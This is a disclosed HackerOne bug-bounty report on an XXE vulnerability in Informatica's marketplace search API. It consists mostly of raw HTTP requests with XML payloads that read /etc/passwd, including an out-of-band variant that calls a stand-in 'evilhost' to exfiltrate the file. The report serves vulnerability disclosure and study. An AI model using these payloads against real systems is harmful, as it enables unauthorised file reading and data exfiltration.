# [marketplace.informatica.com] - XXE

## Report Details
- **Report ID**: 106797
- **URL**: https://hackerone.com/reports/106797
- **State**: Closed
- **Severity**: high
- **Submitted**: 2015-12-24T18:17:17.892Z
- **Disclosed**: 2016-12-09T08:06:26.920Z

## Reporter
- **Username**: yarbabin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
Request:
`POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1`
`Host: marketplace.informatica.com`
`Connection: keep-alive`
`Content-Length: 140`
`Accept: */*`
`X-J-Token: no-user`
`X-Requested-With: XMLHttpRequest`
`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`
`Origin: https://marketplace.informatica.com`
`Content-Type: application/json`
`Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa`
`Accept-Encoding: gzip, deflate`
`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`

`{"params":{"source":"marketplace","rows":5,"offset":0,"queryParams":{"query":"lol","fieldList":"[\"id\", \"title\"]","sortBy":"relevance"}}}`

But, if we change content-type to application/xml and convert JSON to XML:
`POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1`
`Host: marketplace.informatica.com`
`Connection: keep-alive`
`Content-Length: 350`
`Accept: */*`
`X-J-Token: no-user`
`X-Requested-With: XMLHttpRequest`
`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`
`Origin: https://marketplace.informatica.com`
`Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa`
`Accept-Encoding: gzip, deflate`
`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`
`Content-Type: application/xml;charset=UTF-8`

`<?xml version="1.0" encoding="UTF-8" standalone="no"?>`
`<!DOCTYPE foo [  `
`<!ELEMENT foo ANY >`
`<!ENTITY xxe SYSTEM "file:///etc/passwd1" >]>`
`<params>`
`<offset>0</offset>`
`<queryParams>`
`<query>&xxe;</query>`
`<sortBy>relevance</sortBy>`
`<fieldList>["id", "title"]</fieldList>`
`</queryParams>`
`<source>marketplace</source>`
`<rows>5</rows>`
`</params>`

I get response: `JAXBException occurred : /etc/passwd1 (No such file or directory). /etc/passwd1 (No such file or directory). `

Then, i try to get /etc/passwd with OOB vector:
`POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1`
`Host: marketplace.informatica.com`
`Connection: keep-alive`
`Content-Length: 350`
`Accept: */*`
`X-J-Token: no-user`
`X-Requested-With: XMLHttpRequest`
`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`
`Origin: https://marketplace.informatica.com`
`Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa`
`Accept-Encoding: gzip, deflate`
`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`
`Content-Type: application/xml;charset=UTF-8`

`<?xml version="1.0" encoding="UTF-8" standalone="no"?>`
`<!DOCTYPE foo [  `
`<!ENTITY % b SYSTEM "file:///etc/passwd">`
`<!ENTITY % asd SYSTEM "http://evilhost/xx.html">  %asd;  %rrr;]>`
`<params>`
`<offset>0</offset>`
`<queryParams>`
`<query>&xxe;</query>`
`<sortBy>relevance</sortBy>`
`<fieldList>["id", "title"]</fieldList>`
`</queryParams>`
`<source>marketplace</source>`
`<rows>5</rows>`
`</params>`

And I got it :) 

## Attachments
- xxe_infor.png
